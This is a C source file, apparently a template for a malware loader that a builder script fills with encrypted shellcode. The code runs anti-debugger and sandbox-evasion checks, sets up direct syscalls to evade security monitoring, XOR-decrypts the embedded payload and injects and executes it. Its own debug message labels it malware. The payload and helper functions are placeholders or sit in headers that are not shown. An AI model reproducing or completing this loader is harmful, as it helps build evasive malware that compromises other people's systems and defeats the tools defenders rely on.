// #include <windows.h>
#include "core/utils.h"
#include "techniques/T_encryption.h"
#include "techniques/T_injection.h"
#include "techniques/T_evasion.h"

/*{{DEFINES}}*/

// Placeholders sẽ được builder.py thay thế
unsigned char shellcode[] = /*{{SHELLCODE}}*/
unsigned int shellcode_len = /*{{SHELLCODE_LEN}}*/;
char* key = /*{{KEY}}*/;

PVOID g_syscall_addr = NULL;
DWORD g_ssn_NtAllocateVirtualMemory = 0;
DWORD g_ssn_NtCreateThreadEx = 0;
DWORD g_ssn_NtWaitForSingleObject = 0;

int main(void) {

    DEBUG_MSG("Start", "Hello from malware");

    // --- STAGE 0: ENVIRONMENT CHECKS ---
    #ifdef EVASION_CHECKS_ENABLED
        DEBUG_MSG("Evasion", "Running environment checks...");
        if (IsDebugged()) {
            return 0; // Exit silently
        }
        if (IsSandboxed_Sleep()) {
            return 0; // Exit silently
        }
        if (IsSandboxed_LowRam()) {
            return 0; // Exit silently
        }
        DEBUG_MSG("Evasion", "Environment checks passed.");
    #endif

    // --- Initialze ---
    #ifdef USE_DIRECT_SYSCALLS
        DEBUG_MSG("Initialze", "Initialze syscall...");
        if (!InitializeSyscalls()) {
            // Có thể thêm một hành động thoát im lặng ở đây
            return 1; 
        }
    #endif

    // Stage 1 -> 4
    DEBUG_MSG("Decrypt", "Decrypt shellcode...");
    #ifdef ENCRYPTION_XOR
        Decrypt_XOR(shellcode, shellcode_len, key);
    #endif


    // Bước 3: Inject và thực thi
    DEBUG_MSG("Execute", "Inject our shellcode...");
    #ifdef INJECTION_CLASSIC
        Inject_Classic(shellcode, shellcode_len);
    #endif

    return 0;
}